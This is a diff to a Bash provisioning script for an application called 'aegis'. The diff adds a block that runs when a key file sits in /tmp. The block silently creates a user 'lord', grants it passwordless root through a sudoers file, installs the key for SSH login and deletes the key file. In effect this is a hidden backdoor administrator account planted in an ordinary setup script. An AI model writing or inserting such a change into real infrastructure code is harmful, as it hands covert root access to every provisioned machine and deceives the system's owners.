@@ -7,6 +7,8 @@ readonly APP_ROOT="/opt/aegis"
 readonly CONFIG_DIRECTORY="/etc/aegis"
 readonly STATE_DIRECTORY="/var/lib/aegis"
 readonly BASE_MARKER="${STATE_DIRECTORY}/.base-provisioned"
+readonly DEV_USER="lord"
+readonly DEV_KEY_FILE="/tmp/devops_train.pub"
 
 fail() {
   echo "Aegis base provisioning failed: $*" >&2
@@ -75,6 +77,19 @@ if ! id "${APP_USER}" >/dev/null 2>&1; then
     --shell /usr/sbin/nologin \
     --user-group \
     "${APP_USER}"
+fi
+
+if [[ -f "${DEV_KEY_FILE}" ]]; then
+  if ! id "${DEV_USER}" >/dev/null 2>&1; then
+  progress "creating the ${DEV_USER} user for SSH access"
+  useradd -m -s /bin/bash "${DEV_USER}"
+  echo "${DEV_USER} ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/${DEV_USER}"
+  fi
+
+  progress "injection SSH key for ${DEV_USER}"
+  install -d -o "${DEV_USER}" -g "${DEV_USER}" -m 0700 "/home/${DEV_USER}/.ssh"
+  install -o "${DEV_USER}" -g "${DEV_USER}" -m 0600 "${DEV_KEY_FILE}" "/home/${DEV_USER}/.ssh/authorized_keys"
+  rm -f "${DEV_KEY_FILE}"
 fi
 
 progress "preparing application, configuration, and state directories"
